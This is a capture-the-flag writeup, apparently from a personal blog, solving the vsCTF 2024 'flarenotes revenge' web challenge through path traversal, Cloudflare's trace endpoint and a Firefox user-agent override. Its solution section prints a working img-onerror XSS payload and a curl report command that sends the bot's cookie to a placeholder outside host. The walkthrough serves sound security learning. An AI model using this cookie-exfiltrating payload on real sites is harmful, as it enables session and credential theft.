---
title: "flarenotes revenge - vsCTF 2024"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "cloudflare", "xss", "express", "headless-browser", "flarenotes", "revenge", "vsctf", "vsctf-2024", "2024", "ctf-writeup"]
summary: "![Zimzi's avatar](https://substack.com/@zimzi)"
source:
  name: "CTFtime writeup #39228"
  url: "https://ctftime.org/writeup/39228"
original_source: "https://zimzi.substack.com/p/vsctf-2024-flarenotes-revenge"
ctf:
  name: "vsCTF 2024"
  year: 2024
  challenge: "flarenotes revenge"
---

## Metadata

- **CTF:** vsCTF 2024
- **Task:** flarenotes revenge
- **Author team:** Zimzi
- **CTFtime tags:** cloudflare
- **CTFtime:** <https://ctftime.org/writeup/39228>
- **Original writeup:** <https://zimzi.substack.com/p/vsctf-2024-flarenotes-revenge>

---
# vsCTF 2024 flarenotes revenge

### XSS, Cloudflare

[![Zimzi's avatar](https://substackcdn.com/image/fetch/$s_!7J0a!,w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba6ea3a0-f2af-45ce-9f5d-82bf420f4890_1024x1024.png)](https://substack.com/@zimzi)

[Zimzi](https://substack.com/@zimzi)

Jun 19, 2024

Share

[![](https://substackcdn.com/image/fetch/$s_!uSBA!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F61369b37-3f12-4eb6-85a8-bb35f901d76a_934x327.png)](https://substackcdn.com/image/fetch/$s_!uSBA!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F61369b37-3f12-4eb6-85a8-bb35f901d76a_934x327.png)

 _Notice in the description that the challenge is not meant to be ran locally._

The challenge includes:

  * part of the [source code](https://github.com/zimzimzi/CTFs/tree/main/vsctf_2024/dist) (flarenotes.zip):

    * index.ejs - a template for a note-taking web page. It allows users to add notes via a form, displays a list of existing notes with options to delete them, and provides a URL for sharing their notes with others based on the user's unique identifier.

    * view.ejs - a template for displaying user notes. It dynamically fetches and renders notes from a server endpoint (/raw/{user}) based on the user's unique identifier provided in the URL query parameters and includes a link to report the page. 

    * index.js - a simple Express.js web application that serves as a note-taking platform It uses `playwright` to simulate a browser environment for visiting URLs provided by a user (bot). It seems we have XSS to craft.


  * the website with a note-taking platform:


[![](https://substackcdn.com/image/fetch/$s_!mXDd!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1f0faf61-7a22-466b-bf4b-34b0946c6119_1204x443.png)](https://substackcdn.com/image/fetch/$s_!mXDd!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1f0faf61-7a22-466b-bf4b-34b0946c6119_1204x443.png)

# Overview 

When we add a note, it is sanitized:

  1. First by `he` library. He stands for HTML Entities - HTML encoder/decoder library. he.decode(...) decodes HTML entities in the input string req.body.note. This means it converts entities like &lt;, &gt;, &amp;, etc., back to their corresponding characters like <, >, &, etc. 

  2. Second, DOMPurify is a library that sanitizes HTML. DOMPurify.sanitize(...) cleans the decoded HTML content, ensuring no harmful scripts or tags are present.

  3. Finally, he.encode(...) re-encodes the HTML entities. This means converting characters that could be used in HTML syntax (like <, >, &) back into their entity forms (like &lt;, &gt;, &amp;). 


```
    app.post("/add_note", (req, res) => {
        const ipAddress = req.ip;
        const user = ipToUUID[ipAddress];
        **const noteContent = he.encode(DOMPurify.sanitize(he.decode(req.body.note)));**   if (noteContent) {
            notesByUUID[user].push(noteContent);
        }
        res.redirect("/");
    });****
```

In template `index.ejs` the notes are just displayed as escaped HTML with syntax <%=...%>.

```
    <% notes.forEach((note, idx)=> { %>
        <li>
            **< %= note %>** <a href="/delete_note/<%= idx %>">Delete</a>
         </li>
     <% }) %>
```

In template `view.ejs` the notes are fetched from `URL/raw/{user_id}`. Then, parse by `DOMParser().parseFromString` as `text/html`. Next, it returns the text content of this element. The result is assigned to the innerHTML of `li`.

```
    const res = await fetch(`${window.location.origin}/raw/${params.get("user")}`, {headers: new Headers(JSON.parse(params.get("headers") || "{}"))});
    
    if (!res.ok) return;
    
    const data = (await res.text()).split("\n");
    
    data.forEach((note) => {
         const li = document.createElement("li");
         **li.innerHTML = new DOMParser().parseFromString(note, "text/html").documentElement.textContent;**
         list.appendChild(li);
    });
```

The sanitization looks legit. Taking both sanitization and parsing together, we do:

```
    li.innerHTML = new DOMParser().parseFromString(he.encode(DOMPurify.sanitize(he.decode(req.body.note))), "text/html").documentElement.textContent;
```

which is just:

```
    li.innerHTML = DOMPurify.sanitize(he.decode(req.body.note));
```

which should be safe.

# XSS

At first, I tried focusing on `view.ejs` to craft XSS. I noticed splitting `data` by a new line:

```
    const data = (await res.text()).split("\n");
```

and injecting a path in the `user` parameter:

```
    const res = await fetch(**`${window.location.origin}/raw/${params.get("user")}`** , {
         headers: new Headers(JSON.parse(params.get("headers") || "{}"))
    });
```

Next thing I noticed is how `fetch` behaves for this URL: https://flarenotes.vsc.tf/view/raw/../x, which is constructed from a https://flarenotes.vsc.tf/view/?user=../x.

We check it in the Inspector console:

```
    url = 'https://flarenotes.vsc.tf/raw/../x'
    await fx = fetch(url)
```

And look at the Network tab:

```
    Request URL: https://flarenotes.vsc.tf/x
```

It seems that we access the url `/x` path instead of the user `x`. Consequently, from `view.ejs` we access other endpoints.

Next, the noticeable part of the code is in the `report` endpoint. We can submit any URL that belongs to the challenge host.

```
    app.get("/report", async (req, res) => {
        try {
            if (new URL(req.query.url).host !== process.env.CHALL_HOST) {
                return res.send("wtf is this lmao");
            }
        } catch (e) {
            return res.send("invalid url");
        }
    
    ...
    
    await page.goto(req.query.url, { waitUntil: "domcontentloaded" });
    ...
    });
```

All in all, I was missing something. I didn't craft any XSS.

# Fail

I gave up. CTF ended. Finally, I read this post on Discord:

[![](https://substackcdn.com/image/fetch/$s_!Bkwn!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F157e6c9d-0fcb-441a-8493-f475e981c0ac_649x160.png)](https://substackcdn.com/image/fetch/$s_!Bkwn!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F157e6c9d-0fcb-441a-8493-f475e981c0ac_649x160.png)

The `/cdn-cgi/trace` endpoint is served by Cloudflare on all sites proxied handled by them. Let's check how it looks:

```
    fl=x
    h=URL
    ip=IP
    ts=x
    visit_scheme=https
    uag=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
    colo=LHR
    sliver=none
    http=http/3
    loc=Wonderland
    tls=x
    sni=plaintext
    warp=off
    gateway=off
    rbi=off
    kex=x
```

But how can we use it? 

Let's look at `view.ejs` endpoint one more time. It seems that we can control headers, so maybe we can change the user agent?

```
    const res = await fetch(`${window.location.origin}/raw/${params.get("user")}`, {
                        headers: new Headers(JSON.parse(params.get("headers") || "{}"))
      });
```

What's interesting is that we launch the Firefox browser, while typically bots use Chromium. It is not by accident. 

```
      const browser = await firefox.launch();
        const context = await browser.newContext();
    
        const page = await context.newPage();
        await page.goto(`http://${process.env.CHALL_HOST}/`);
    
        await context.addCookies([
            {
                name: "flag",
                value: process.env.FLAG || "vsctf{fake_flag}",
                domain: process.env.CHALL_HOST,
                path: "/",
            },
        ]);
```

In Chromium, the given link:

```
    https://flarenotes.vsc.tf/view/?user=../cdn-cgi/trace&headers={"user-agent":"bond"} 
    
    _(URL-encoded header content)_
```

doesn't cause change of user-agent `uag` value to the refect the header - Chrome ignores User-Agent headers overrides, while Firefox doesn’t.

# Solution

  1. Access https://flarenotes.vsc.tf/view/cdn-cgi/trace from a fetch.

  2. Leak the cookie by typical `img onerror` XSS in the user-agent header: https://flarenotes.vsc.tf/view/?user=../cdn-cgi/trace&headers={user-agent:<img onerror=location.href=URL+escape(document.cookie) src=x}

  3. Report URL encoded URL


```
    curl 'https://flarenotes.vsc.tf/report?url=https%3A//flarenotes.vsc.tf/view/%3Fuser%3D../cdn-cgi/trace%26headers%3D%257B%2522user-agent%2522%253A%2520%2522%253Cimg%2520onerror%253D%255C%2522location.href%253D%2527https%253A//URL/%2527%252Bescape%2528document.cookie%2529%255C%2522%2520src%253Dx%253E%2522%257D' \
      -H 'referer: https://flarenotes.vsc.tf/view/?user=x' \
      -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    successfully reported!# 
```

And get a flag:

URL/flag%3Dvsctf%7Bsh0uldnt_h4v3_us3d_cr1mefl4r3%7D

Enjoy happy hacking! Bye bye!

Thanks for reading Zimzi’s Substack! Subscribe for free to receive new posts and support my work.

Share
